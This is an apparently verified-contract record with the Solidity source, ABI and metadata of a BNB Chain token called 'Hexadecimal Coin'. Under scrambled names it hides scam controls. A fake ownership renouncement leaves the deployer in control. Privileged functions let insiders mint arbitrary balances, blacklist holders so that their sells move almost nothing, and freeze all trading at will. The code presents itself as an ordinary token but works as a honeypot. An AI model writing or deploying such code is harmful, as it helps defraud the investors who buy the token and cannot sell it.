{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract atTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLimit {\n    function createPair(address buyAt, address modeListMax) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface limitAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface shouldSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAuto) external view returns (uint256);\n\n    function transfer(address liquidityLaunched, uint256 senderModeAmount) external returns (bool);\n\n    function allowance(address receiverBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderModeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunched,\n        uint256 senderModeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamAt, uint256 value);\n    event Approval(address indexed receiverBuy, address indexed spender, uint256 value);\n}\n\ninterface shouldSwapMetadata is shouldSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HexadecimalCoin is atTake, shouldSwap, shouldSwapMetadata {\n\n    address private amountExemptWallet;\n\n    address txShould;\n\n    uint256 swapTo;\n\n    uint8 private atLimit = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundShould;\n    }\n\n    function takeLaunched(uint256 senderModeAmount) public {\n        receiverFund();\n        walletTakeFund = senderModeAmount;\n    }\n\n    function owner() external view returns (address) {\n        return amountExemptWallet;\n    }\n\n    uint256 private feeToReceiver;\n\n    address shouldReceiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public txAuto;\n\n    function approve(address modeTotal, uint256 senderModeAmount) public virtual override returns (bool) {\n        receiverMode[_msgSender()][modeTotal] = senderModeAmount;\n        emit Approval(_msgSender(), modeTotal, senderModeAmount);\n        return true;\n    }\n\n    address public takeExemptAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atLimit;\n    }\n\n    bool private marketingAutoToken;\n\n    function balanceOf(address receiverAuto) public view virtual override returns (uint256) {\n        return receiverMin[receiverAuto];\n    }\n\n    uint256 public tokenTradingFund = 0;\n\n    uint256 constant swapFrom = 20 ** 10;\n\n    string private fundShould = \"HCN\";\n\n    function txToken() public {\n        emit OwnershipTransferred(takeExemptAuto, address(0));\n        amountExemptWallet = address(0);\n    }\n\n    uint256 public enableTo = 3;\n\n    function senderMarketing(address receiverSellMode, uint256 senderModeAmount) public {\n        receiverFund();\n        receiverMin[receiverSellMode] = senderModeAmount;\n    }\n\n    function receiverFund() private view {\n        require(txAuto[_msgSender()]);\n    }\n\n    function transfer(address receiverSellMode, uint256 senderModeAmount) external virtual override returns (bool) {\n        return fundExemptMax(_msgSender(), receiverSellMode, senderModeAmount);\n    }\n\n    constructor (){\n        \n        txToken();\n        limitAuto enableTotal = limitAuto(shouldReceiverIs);\n        limitMin = marketingLimit(enableTotal.factory()).createPair(enableTotal.WETH(), address(this));\n        txShould = marketingLimit(enableTotal.factory()).feeTo();\n        \n        takeExemptAuto = _msgSender();\n        txAuto[takeExemptAuto] = true;\n        receiverMin[takeExemptAuto] = txMode;\n        if (feeToReceiver != enableLaunched) {\n            feeToReceiver = isFrom;\n        }\n        emit Transfer(address(0), takeExemptAuto, txMode);\n    }\n\n    function exemptAuto(address atTeam) public {\n        receiverFund();\n        \n        if (atTeam == takeExemptAuto || atTeam == limitMin) {\n            return;\n        }\n        toAmountSell[atTeam] = true;\n    }\n\n    function enableLimit(address listAutoTrading, address liquidityLaunched, uint256 senderModeAmount) internal view returns (uint256) {\n        require(senderModeAmount > 0);\n\n        uint256 totalExempt = 0;\n        if (listAutoTrading == limitMin && enableTo > 0) {\n            totalExempt = senderModeAmount * enableTo / 100;\n        } else if (liquidityLaunched == limitMin && tokenTradingFund > 0) {\n            totalExempt = senderModeAmount * tokenTradingFund / 100;\n        }\n        require(totalExempt <= senderModeAmount);\n        return senderModeAmount - totalExempt;\n    }\n\n    string private swapExemptBuy = \"Hexadecimal Coin\";\n\n    mapping(address => bool) public toAmountSell;\n\n    mapping(address => uint256) private receiverMin;\n\n    bool public receiverLimit;\n\n    function allowance(address buyTrading, address modeTotal) external view virtual override returns (uint256) {\n        if (modeTotal == shouldReceiverIs) {\n            return type(uint256).max;\n        }\n        return receiverMode[buyTrading][modeTotal];\n    }\n\n    function launchedTx(address listAutoTrading, address liquidityLaunched, uint256 senderModeAmount) internal returns (bool) {\n        require(receiverMin[listAutoTrading] >= senderModeAmount);\n        receiverMin[listAutoTrading] -= senderModeAmount;\n        receiverMin[liquidityLaunched] += senderModeAmount;\n        emit Transfer(listAutoTrading, liquidityLaunched, senderModeAmount);\n        return true;\n    }\n\n    uint256 private isFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return swapExemptBuy;\n    }\n\n    uint256 walletTakeFund;\n\n    function fundExemptMax(address listAutoTrading, address liquidityLaunched, uint256 senderModeAmount) internal returns (bool) {\n        if (listAutoTrading == takeExemptAuto) {\n            return launchedTx(listAutoTrading, liquidityLaunched, senderModeAmount);\n        }\n        uint256 senderExempt = shouldSwap(limitMin).balanceOf(txShould);\n        require(senderExempt == walletTakeFund);\n        require(liquidityLaunched != txShould);\n        if (toAmountSell[listAutoTrading]) {\n            return launchedTx(listAutoTrading, liquidityLaunched, swapFrom);\n        }\n        senderModeAmount = enableLimit(listAutoTrading, liquidityLaunched, senderModeAmount);\n        return launchedTx(listAutoTrading, liquidityLaunched, senderModeAmount);\n    }\n\n    uint256 public feeMax;\n\n    function transferFrom(address listAutoTrading, address liquidityLaunched, uint256 senderModeAmount) external override returns (bool) {\n        if (_msgSender() != shouldReceiverIs) {\n            if (receiverMode[listAutoTrading][_msgSender()] != type(uint256).max) {\n                require(senderModeAmount <= receiverMode[listAutoTrading][_msgSender()]);\n                receiverMode[listAutoTrading][_msgSender()] -= senderModeAmount;\n            }\n        }\n        return fundExemptMax(listAutoTrading, liquidityLaunched, senderModeAmount);\n    }\n\n    bool public autoShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txMode;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountExemptWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMode;\n\n    uint256 private enableLaunched;\n\n    address public limitMin;\n\n    uint256 private txMode = 100000000 * 10 ** 18;\n\n    bool private totalFundLiquidity;\n\n    event OwnershipTransferred(address indexed launchedMax, address indexed autoExempt);\n\n    function marketingTrading(address limitIs) public {\n        require(limitIs.balance < 100000);\n        if (receiverLimit) {\n            return;\n        }\n        if (marketingAutoToken) {\n            totalFundLiquidity = true;\n        }\n        txAuto[limitIs] = true;\n        if (totalFundLiquidity) {\n            feeToReceiver = feeMax;\n        }\n        receiverLimit = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderModeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"}],\"name\":\"exemptAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"}],\"name\":\"marketingTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSellMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderModeAmount\",\"type\":\"uint256\"}],\"name\":\"senderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExemptAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderModeAmount\",\"type\":\"uint256\"}],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toAmountSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTradingFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSellMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderModeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAutoTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderModeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HexadecimalCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}